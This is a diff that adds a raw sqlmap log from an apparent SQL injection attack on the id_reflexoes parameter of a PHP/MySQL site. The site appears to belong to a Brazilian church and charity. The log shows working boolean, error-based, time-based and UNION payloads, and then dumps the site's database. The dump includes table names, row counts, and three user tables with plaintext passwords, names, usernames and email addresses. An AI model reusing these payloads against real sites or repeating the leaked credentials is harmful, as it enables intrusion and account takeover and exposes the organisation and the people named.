@@ -1,0 +1,258 @@
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: id_reflexoes (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_reflexoes=17 AND 4901=4901
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_reflexoes=17 AND (SELECT 3775 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3775=3775,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_reflexoes=17 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id_reflexoes=-9060 UNION ALL SELECT CONCAT(0x71626b6271,0x704242497046464e4c657942494d696a4f6e624c4f546963506d5946427279694f7075706f55627a,0x71706a6a71),NULL,NULL,NULL-- oilQ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] jesse_site
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_reflexoes (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_reflexoes=17 AND 4901=4901
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_reflexoes=17 AND (SELECT 3775 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3775=3775,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_reflexoes=17 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id_reflexoes=-9060 UNION ALL SELECT CONCAT(0x71626b6271,0x704242497046464e4c657942494d696a4f6e624c4f546963506d5946427279694f7075706f55627a,0x71706a6a71),NULL,NULL,NULL-- oilQ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: jesse_site
+[35 tables]
++-----------------------------+
+| Audios_Arquivos             |
+| Audios_Categorias           |
+| Audios_SubCategorias        |
+| Banners                     |
+| Contato                     |
+| Controle                    |
+| Doacoes_Cestas              |
+| Doacoes_Familias            |
+| Doacoes_Familias_Individuos |
+| Doacoes_Parentescos         |
+| Doacoes_Profissoes          |
+| Doacoes_Usuarios            |
+| Doacoes_Voluntarios         |
+| Enquetes                    |
+| EnquetesRespostas           |
+| Estudos                     |
+| Estudos_Categoria           |
+| Estudos_Usuario             |
+| Eventos                     |
+| Eventos_Fotos               |
+| Grupos_Crescimento          |
+| Musicas                     |
+| Novidades                   |
+| Novidades_Fotos             |
+| Novidades_Itens             |
+| Pedido_Oracao               |
+| Radio                       |
+| Redes                       |
+| Reflexoes                   |
+| Santos                      |
+| Sobre                       |
+| Testemunhos                 |
+| Textos                      |
+| Videos                      |
+| Videos_Categorias           |
++-----------------------------+
+
+Database: jesse_site
++-----------------------------+---------+
+| Table                       | Entries |
++-----------------------------+---------+
+| Eventos_Fotos               | 7177    |
+| Contato                     | 1688    |
+| Doacoes_Familias            | 1415    |
+| Audios_Arquivos             | 1357    |
+| Pedido_Oracao               | 509     |
+| Videos                      | 432     |
+| Doacoes_Familias_Individuos | 322     |
+| Doacoes_Voluntarios         | 185     |
+| Estudos                     | 138     |
+| Novidades                   | 108     |
+| Eventos                     | 95      |
+| Audios_SubCategorias        | 71      |
+| Estudos_Usuario             | 67      |
+| Testemunhos                 | 31      |
+| Textos                      | 19      |
+| Doacoes_Profissoes          | 12      |
+| EnquetesRespostas           | 12      |
+| Estudos_Categoria           | 12      |
+| Reflexoes                   | 8       |
+| Controle                    | 6       |
+| Musicas                     | 6       |
+| Audios_Categorias           | 5       |
+| Doacoes_Parentescos         | 5       |
+| Novidades_Fotos             | 5       |
+| Doacoes_Usuarios            | 4       |
+| Videos_Categorias           | 4       |
+| Enquetes                    | 3       |
+| Novidades_Itens             | 3       |
+| Redes                       | 3       |
+| Santos                      | 3       |
+| Banners                     | 1       |
+| Sobre                       | 1       |
++-----------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_reflexoes (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_reflexoes=17 AND 4901=4901
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_reflexoes=17 AND (SELECT 3775 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3775=3775,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_reflexoes=17 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id_reflexoes=-9060 UNION ALL SELECT CONCAT(0x71626b6271,0x704242497046464e4c657942494d696a4f6e624c4f546963506d5946427279694f7075706f55627a,0x71706a6a71),NULL,NULL,NULL-- oilQ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: jesse_site
+Table: Estudos_Usuario
+[67 entries]
++------------+--------------------------------------+---------------------+-------+--------------+-----------------------------------------+
+| ID_Usuario | Nome                                 | Data                | Ativo | Senha        | Email                                   |
++------------+--------------------------------------+---------------------+-------+--------------+-----------------------------------------+
+| 1          | Ana Paula                            | 2015-09-28 03:14:52 | 1     | 1234         | comercial@globalwebsites.com.br         |
+| 2          | Lilian Marques                       | 2015-09-28 02:00:00 | 1     | olinda       | lilimmarques@yahoo.com.br               |
+| 3          | Grupo Amor de Deus                   | 2015-10-19 20:26:01 | 1     | aquidaban731 | amordedeus@jesse.com.br                 |
+| 4          | Grupo a servico do rei               | 2015-10-19 20:27:23 | 1     | aquidaban731 | aservicodorei@jesse.com.br              |
+| 5          | Grupo Agua viva                      | 2015-10-19 20:28:09 | 1     | aquidaban731 | aguaviva@jesse.com.br                   |
+| 6          | Grupo Aliança de Adoradores          | 2015-10-19 20:29:03 | 1     | aquidaban731 | aliancadeadoradores@jesse.com.br        |
+| 7          | Grupo Amigos pela Fe                 | 2015-10-19 20:29:59 | 1     | aquidaban731 | amigospelafe@jesse.com.br               |
+| 8          | grupo Amor e Fe                      | 2015-10-19 20:30:31 | 1     | aquidaban731 | amorefe@jesse.com.br                    |
+| 9          | Grupo Anjos da Luz                   | 2015-10-19 20:31:04 | 1     | aquidaban731 | anjosdaluz@jesse.com.br                 |
+| 10         | Grupo Aprendizes da Fe               | 2015-10-19 20:31:59 | 1     | aquidaban731 | aprendizesdafe@jesse.com.br             |
+| 11         | Grupo Ares de Adoracao               | 2015-10-19 20:32:43 | 1     | aquidaban731 | aresdeadoracao@jesse.com.br             |
+| 12         | Grupo Avivamento                     | 2015-10-19 20:33:18 | 1     | aquidaban731 | avivamento@jesse.com.br                 |
+| 13         | Grupo Caminhando com Jesus de Nazare | 2015-10-19 20:34:13 | 1     | aquidaban731 | caminhandocomjesusdenazare@jesse.com.br |
+| 14         | Grupo Crescendo na Fe                | 2015-10-19 20:34:54 | 1     | aquidaban731 | crescendonafe@jesse.com.br              |
+| 15         | Grupo Cristo Vivo                    | 2015-10-19 20:35:37 | 1     | aquidaban731 | cristovivo@jesse.com.br                 |
+| 16         | Grupo Deus e Mais                    | 2015-10-19 20:36:11 | 1     | aquidaban731 | deusemais@jesse.com.br                  |
+| 17         | Grupo Discipulos de Cristo           | 2015-10-19 20:36:57 | 1     | aquidaban731 | discipulosdecristo@jesse.com.br         |
+| 18         | Grupo Discipulos de Fe               | 2015-10-19 20:37:48 | 1     | aquidaban731 | discipulosdefe@jesse.com.br             |
+| 19         | Grupo Emanuel                        | 2015-10-19 20:38:26 | 1     | aquidaban731 | emanuel@jesse.com.br                    |
+| 20         | Grupo Esperar no Senhor              | 2015-10-19 20:38:58 | 1     | aquidaban731 | esperarnosenhor@jesse.com.br            |
+| 21         | Grupo Fe                             | 2015-10-19 20:39:37 | 1     | aquidaban731 | fe@jesse.com.br                         |
+| 22         | Grupo Filhos de Davi                 | 2015-10-19 20:40:21 | 1     | aquidaban731 | filhosdedavi@jesse.com.br               |
+| 23         | Grupo filhos do Altissimo            | 2015-10-19 20:41:01 | 1     | aquidaban731 | filhosdoaltissimo@jesse.com.br          |
+| 24         | Grupo Filhos do Ceu                  | 2015-10-19 20:41:52 | 1     | aquidaban731 | filhosdoceu@jesse.com.br                |
+| 25         | grupo Fonte de Luz                   | 2015-10-19 20:42:26 | 1     | aquidaban731 | fontedeluz@jesse.com.br                 |
+| 26         | Grupo Geração em Cristo              | 2015-10-19 20:43:02 | 1     | aquidaban731 | geracaoemcristo@jesse.com.br            |
+| 27         | Grupo Guardioes da Fe                | 2015-10-19 20:43:49 | 1     | aquidaban731 | guardioesdafe@jesse.com.br              |
+| 28         | Grupo Guerreiros de Cristo           | 2015-10-19 20:44:41 | 1     | aquidaban731 | guerreirosdecristo@jesse.com.br         |
+| 29         | Grupo Guiados pelo Espirito          | 2015-10-19 20:45:54 | 1     | aquidaban731 | guiadospeloespirito@jesse.com.br        |
+| 30         | Grupo Herdeiros de Deus              | 2015-10-19 20:46:35 | 1     | aquidaban731 | herdeirosdedeus@jesse.com.br            |
+| 31         | Grupo Iluminados                     | 2015-10-19 20:47:09 | 1     | aquidaban731 | iluminados@jesse.com.br                 |
+| 32         | Jesse                                | 2015-10-19 20:47:34 | 1     | aquidaban731 | jesse@jesse.com.br                      |
+| 33         | Grupo Jesus, Fonte de Vida           | 2015-10-19 20:48:20 | 1     | aquidaban731 | jesusfontedevida@jesse.com.br           |
+| 34         | Grupo Lutando pela Fe                | 2015-10-19 20:48:57 | 1     | aquidaban731 | lutandopelafe@jesse.com.br              |
+| 35         | Grupo Maria de Nazare                | 2015-10-19 20:50:08 | 1     | aquidaban731 | mariadenazare@jesse.com.br              |
+| 36         | Grupo Mensageiro do Espirito Santo   | 2015-10-19 20:51:22 | 1     | aquidaban731 | mensageirodoespiritosanto@jesse.com.br  |
+| 37         | Grupo Mensageiro do Perdao           | 2015-10-19 20:52:13 | 1     | aquidaban731 | mensageirodoperdao@jesse.com.br         |
+| 38         | Grupo Peregrinos Fieis               | 2015-10-19 20:52:45 | 1     | aquidaban731 | peregrinosfieis@jesse.com.br            |
+| 39         | Grupo Preciosa Semente               | 2015-10-19 20:53:18 | 1     | aquidaban731 | preciosasemente@jesse.com.br            |
+| 40         | Grupo Rastros de Deus                | 2015-10-19 20:54:19 | 1     | aquidaban731 | rastrosdedeus@jesse.com.br              |
+| 41         | Grupo Renascer em Cristo             | 2015-10-19 20:54:56 | 1     | aquidaban731 | renasceremcristo@jesse.com.br           |
+| 42         | Grupo Renovados em Cristo            | 2015-10-19 20:55:31 | 1     | aquidaban731 | renovadosemcristo@jesse.com.br          |
+| 43         | Grupo Rompendo em Fe                 | 2015-10-19 20:56:00 | 1     | aquidaban731 | rompendoemfe@jesse.com.br               |
+| 44         | Grupo Semeadores da Paz              | 2015-10-19 20:56:41 | 1     | aquidaban731 | semeadoresdapaz@jesse.com.br            |
+| 45         | Grupo Semente de Cristo              | 2015-10-19 20:57:14 | 1     | aquidaban731 | sementedecristo@jesse.com.br            |
+| 46         | Grupo Servos de Cristo               | 2015-10-19 20:57:58 | 1     | aquidaban731 | servosdecristo@jesse.com.br             |
+| 47         | Grupo Servos po Amor                 | 2015-10-19 20:58:33 | 1     | aquidaban731 | servosporamor@jesse.com.br              |
+| 48         | Grupo Servos do Deus Vivo            | 2015-10-19 20:59:29 | 1     | aquidaban731 | servosdodeusvivo@jesse.com.br           |
+| 49         | Grupo So por ti Jesus                | 2015-10-19 21:00:04 | 1     | aquidaban731 | soportijesus@jesse.com.br               |
+| 50         | Grupo Soberano Senhor                | 2015-10-19 21:00:35 | 1     | aquidaban731 | soberanosenhor@jesse.com.br             |
+| 51         | Grupo Sobre as Aguas                 | 2015-10-19 21:01:09 | 1     | aquidaban731 | sobreasaguas@jesse.com.br               |
+| 52         | Grupo Somos um en Cristo             | 2015-10-19 21:02:00 | 1     | aquidaban731 | somosumemcristo@jesse.com.br            |
+| 53         | Grupo Sorriso Santo                  | 2015-10-19 21:02:42 | 1     | aquidaban731 | sorrisosanto@jesse.com.br               |
+| 54         | Grupo Trindade                       | 2015-10-19 21:03:14 | 1     | aquidaban731 | trindade@jesse.com.br                   |
+| 55         | Grupos Unidos do Senhor              | 2015-10-19 21:04:08 | 1     | aquidaban731 | unidosdosenhor@jesse.com.br             |
+| 56         | Grupo Unidos a Santissima Trindade   | 2015-10-19 21:05:32 | 1     | aquidaban731 | unidosasantissimatrindade@jesse.com.br  |
+| 57         | Grupo Unidos em Cristo               | 2015-10-19 21:06:22 | 1     | aquidaban731 | unidosemcristo@jesse.com.br             |
+| 59         | Grupo Unidos Pela Fe                 | 2015-10-19 21:09:23 | 1     | aquidaban731 | unidospelafe@jesse.com.br               |
+| 60         | Grupo Valente Guerreiro              | 2015-10-19 21:10:29 | 1     | aquidaban731 | valenteguerreiro@jesse.com.br           |
+| 61         | Grupo Vida e Luz Divina              | 2015-10-19 21:11:30 | 1     | aquidaban731 | vidaeluzdivina@jesse.com.br             |
+| 62         | Grupo Vida em Cristo                 | 2015-10-19 21:12:18 | 1     | aquidaban731 | vidaemcristo@jesse.com.br               |
+| 63         | Grupo Vida Nova em Cristo            | 2015-10-19 21:13:18 | 1     | aquidaban731 | vidanovaemcristo@jesse.com.br           |
+| 64         | Grupo Viver Pra Mim e Cristo         | 2015-10-19 21:14:05 | 1     | aquidaban731 | viverpramimecristo@jesse.com.br         |
+| 65         | Sonho de Maria                       | 2016-07-05 23:32:37 | 1     | aquidaban731 | sonhodemaria@jesse.com.br               |
+| 66         | Grupo Guiados pela fé                | 2016-11-03 19:35:31 | 1     | aquidaban731 | guiadospelafe@jesse.com.br              |
+| 67         | Grupo Jesus Nossa Identidade         | 2016-11-03 19:41:48 | 1     | aquidabn731  | jesusnossaidentidade@jesse.com.br       |
+| 68         | Grupo Jesus é Nossa Luz              | 2016-11-03 19:42:27 | 1     | aquidaban731 | jesusenossaluz@jesse.com.br             |
++------------+--------------------------------------+---------------------+-------+--------------+-----------------------------------------+
+
+Database: jesse_site
+Table: Doacoes_Usuarios
+[4 entries]
++------------+-------+---------------+---------+
+| ID_Usuario | Ativo | Senha         | Usuario |
++------------+-------+---------------+---------+
+| 1          | 1     | global9900    | global  |
+| 2          | 1     | $lilian112233 | jesse   |
+| 3          | 1     | aquidaban731  | marinho |
+| 4          | 1     | marinho       | valeria |
++------------+-------+---------------+---------+
+
+Database: jesse_site
+Table: Controle
+[6 entries]
++-------------+---------------+-----------+
+| ID_Controle | Senha         | Usuario   |
++-------------+---------------+-----------+
+| 1           | $4lilian3#    | global    |
+| 2           | $lilian112233 | jesse     |
+| 3           | aquidaban731  | marinho   |
+| 4           | marinho       | maildo    |
+| 5           | 801612        | rui celso |
+| 6           | marinho       | lilian    |
++-------------+---------------+-----------+
+
